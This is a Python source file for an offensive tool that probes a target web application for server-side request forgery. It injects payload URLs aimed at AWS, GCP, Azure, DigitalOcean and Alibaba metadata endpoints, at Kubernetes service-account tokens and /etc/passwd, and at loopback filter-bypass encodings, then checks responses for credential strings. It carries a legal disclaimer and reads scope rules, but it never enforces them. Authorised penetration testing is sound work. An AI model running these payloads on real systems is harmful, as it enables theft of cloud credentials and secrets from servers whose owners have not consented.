#!/usr/bin/env python3
# For authorized penetration testing and educational environments only.
# Usage against targets without prior mutual consent is illegal.
# It is the end user's responsibility to obey all applicable local, state and federal laws.
"""Playbook agent for Server-Side Request Forgery (SSRF) and cloud metadata probing."""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
import urllib.parse
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Any

try:
    import httpx
except ImportError:
    httpx = None

from arsenal.scope import parse_scope


def resolve_scope_rules() -> tuple[list[str], list[str]]:
    """Resolve in_scope and out_of_scope lists from active workspace scope."""
    scope_file = os.environ.get("ARSENAL_SCOPE_FILE")
    candidate_paths: list[Path] = []
    if scope_file:
        candidate_paths.append(Path(scope_file))

    cwd = Path.cwd()
    candidate_paths.append(cwd / ".omp" / "arsenal" / "scope.json")
    candidate_paths.append(cwd / ".omp" / "scope.json")

    for p in candidate_paths:
        if p.is_file():
            try:
                doc = parse_scope(p)
                return list(doc.get("in_scope") or []), list(doc.get("out_of_scope") or [])
            except Exception:
                continue

    return [], []


@dataclass
class SSRFProbeTarget:
    name: str
    category: str
    target_url: str
    headers: dict[str, str]
    expected_indicators: list[str]
    method: str = "GET"


METADATA_PROBES: list[SSRFProbeTarget] = [
    SSRFProbeTarget(
        name="aws_imds_v1_credentials",
        category="cloud_metadata",
        target_url="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        headers={},
        expected_indicators=["AccessKeyId", "SecretAccessKey", "Token"],
    ),
    SSRFProbeTarget(
        name="aws_imds_v1_user_data",
        category="cloud_metadata",
        target_url="http://169.254.169.254/latest/user-data",
        headers={},
        expected_indicators=["#!/", "cloud-init", "aws_access_key"],
    ),
    SSRFProbeTarget(
        name="aws_imds_v2_token_request",
        category="cloud_metadata",
        target_url="http://169.254.169.254/latest/api/token",
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        expected_indicators=["AQAE"],
        method="PUT",
    ),
    SSRFProbeTarget(
        name="gcp_metadata_token",
        category="cloud_metadata",
        target_url="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        headers={"Metadata-Flavor": "Google"},
        expected_indicators=["access_token", "token_type", "expires_in"],
    ),
    SSRFProbeTarget(
        name="azure_metadata_instance",
        category="cloud_metadata",
        target_url="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        headers={"Metadata": "true"},
        expected_indicators=["compute", "vmId", "resourceGroupName"],
    ),
    SSRFProbeTarget(
        name="digitalocean_metadata",
        category="cloud_metadata",
        target_url="http://169.254.169.254/metadata/v1.json",
        headers={},
        expected_indicators=["droplet_id", "hostname", "vendor_data"],
    ),
    SSRFProbeTarget(
        name="alibaba_metadata_ram",
        category="cloud_metadata",
        target_url="http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        headers={},
        expected_indicators=["AccessKeyId", "AccessKeySecret", "SecurityToken"],
    ),
    SSRFProbeTarget(
        name="kubernetes_service_account_token",
        category="container_internal",
        target_url="file:///var/run/secrets/kubernetes.io/serviceaccount/token",
        headers={},
        expected_indicators=["eyJhbGciOiJSUzI1NiIs"],
    ),
    SSRFProbeTarget(
        name="linux_passwd_disclosure",
        category="local_file",
        target_url="file:///etc/passwd",
        headers={},
        expected_indicators=["root:x:0:0:", "/bin/bash", "/bin/sh"],
    ),
    SSRFProbeTarget(
        name="loopback_dotted_hex",
        category="filter_bypass",
        target_url="http://0x7f000001/",
        headers={},
        expected_indicators=["127.0.0.1", "localhost"],
    ),
    SSRFProbeTarget(
        name="loopback_decimal",
        category="filter_bypass",
        target_url="http://2130706433/",
        headers={},
        expected_indicators=["127.0.0.1", "localhost"],
    ),
    SSRFProbeTarget(
        name="loopback_ipv6",
        category="filter_bypass",
        target_url="http://[::1]/",
        headers={},
        expected_indicators=["127.0.0.1", "localhost"],
    ),
]

NEGATIVE_BASELINE_PROBE = SSRFProbeTarget(
    name="negative_rfc1918_control",
    category="baseline_control",
    target_url="http://10.254.254.253:59182/nonexistent_baseline_9f82",
    headers={},
    expected_indicators=[],
)


def run_ssrf_audit(
    base_target: str,
    param_name: str = "url",
    concurrency: int = 5,
    rate_limit: float = 10.0,
    timeout: float = 10.0,
    proxy: str | None = None,
    auth_header: str | None = None,
) -> dict[str, Any]:
    """Execute tripartite SSRF audit probing cloud metadata, filter evasion, and verification oracles."""
    if httpx is None:
        return {"error": "httpx package is required for SSRF probing. Install with 'pip install httpx'."}

    request_headers: dict[str, str] = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Arsenal/4.0 SSRF-Probe",
    }
    if auth_header:
        request_headers["Authorization"] = auth_header

    proxies = {"all://": proxy} if proxy else None
    client = httpx.Client(
        headers=request_headers,
        timeout=timeout,
        proxies=proxies,
        verify=False,
        follow_redirects=True,
    )

    results: list[dict[str, Any]] = []
    min_interval = 1.0 / rate_limit if rate_limit > 0 else 0.0
    last_req_time = 0.0

    def rate_limit_sleep() -> None:
        nonlocal last_req_time
        elapsed = time.time() - last_req_time
        if elapsed < min_interval:
            time.sleep(min_interval - elapsed)
        last_req_time = time.time()

    # Step 1: Run Negative Baseline Control Probe
    rate_limit_sleep()
    control_probe_url = base_target
    parsed_base = urllib.parse.urlparse(base_target)
    query_params = dict(urllib.parse.parse_qsl(parsed_base.query))
    query_params[param_name] = NEGATIVE_BASELINE_PROBE.target_url
    encoded_query = urllib.parse.urlencode(query_params)
    control_req_url = urllib.parse.urlunparse(parsed_base._replace(query=encoded_query))

    baseline_status = None
    baseline_length = 0
    try:
        resp = client.get(control_req_url)
        baseline_status = resp.status_code
        baseline_length = len(resp.text)
    except Exception as exc:
        baseline_status = f"connection_error: {exc}"

    # Step 2: Run Active Probes
    confirmed_findings: list[dict[str, Any]] = []

    for probe in METADATA_PROBES:
        rate_limit_sleep()
        query_params[param_name] = probe.target_url
        req_url = urllib.parse.urlunparse(parsed_base._replace(query=urllib.parse.urlencode(query_params)))

        probe_record: dict[str, Any] = {
            "probe_name": probe.name,
            "category": probe.category,
            "injected_target": probe.target_url,
            "status_code": None,
            "body_length": 0,
            "indicators_matched": [],
            "confirmed_positive": False,
            "is_imds_v2_gated": False,
            "is_waf_blocked": False,
        }

        try:
            resp = client.get(req_url)
            body = resp.text
            probe_record["status_code"] = resp.status_code
            probe_record["body_length"] = len(body)

            # Check indicators
            matched = [ind for ind in probe.expected_indicators if ind in body]
            probe_record["indicators_matched"] = matched

            # Differentiate WAF blocks
            if resp.status_code in (403, 503) and any(
                w in body.lower() for w in ["cloudflare", "akamai", "aws waf", "access denied", "blocked"]
            ):
                probe_record["is_waf_blocked"] = True

            # Differentiate IMDSv2 gating (AWS returns 401 Unauthorized for direct metadata GET)
            if resp.status_code == 401 and "169.254.169.254" in probe.target_url:
                probe_record["is_imds_v2_gated"] = True

            # Verification Oracle:
            # 1. Indicator matched in response body
            # 2. Response differs significantly from negative baseline control (not a static 200 echo)
            if matched and (len(body) != baseline_length or resp.status_code != baseline_status):
                probe_record["confirmed_positive"] = True
                confirmed_findings.append(probe_record)

        except Exception as exc:
            probe_record["error"] = str(exc)

        results.append(probe_record)

    client.close()

    oracle_summary = {
        "verified_vulnerable": len(confirmed_findings) > 0,
        "confirmed_count": len(confirmed_findings),
        "baseline_control": {
            "target": NEGATIVE_BASELINE_PROBE.target_url,
            "status": baseline_status,
            "body_length": baseline_length,
        },
        "confirmed_findings": confirmed_findings,
        "all_probes": results,
    }

    return oracle_summary


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Automated Server-Side Request Forgery (SSRF) and Cloud Metadata Probe Agent."
    )
    parser.add_argument("--target", required=True, help="Target URL with injectable parameter (e.g. https://app.example.com/fetch)")
    parser.add_argument("--param", default="url", help="Query parameter name to inject SSRF payloads into (default: url)")
    parser.add_argument("--rate-limit", type=float, default=10.0, help="Maximum requests per second (default: 10.0)")
    parser.add_argument("--timeout", type=float, default=10.0, help="HTTP request timeout in seconds (default: 10.0)")
    parser.add_argument("--proxy", help="Optional HTTP/HTTPS proxy URL (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--auth-header", help="Optional Authorization header value (e.g. 'Bearer <token>')")

    args = parser.parse_args()

    in_scope, out_of_scope = resolve_scope_rules()

    result = run_ssrf_audit(
        base_target=args.target,
        param_name=args.param,
        rate_limit=args.rate_limit,
        timeout=args.timeout,
        proxy=args.proxy,
        auth_header=args.auth_header,
    )

    print(json.dumps(result, indent=2, default=str))
    if result.get("error"):
        sys.exit(2)
    if result.get("verified_vulnerable"):
        sys.exit(0)
    sys.exit(0)


if __name__ == "__main__":
    main()
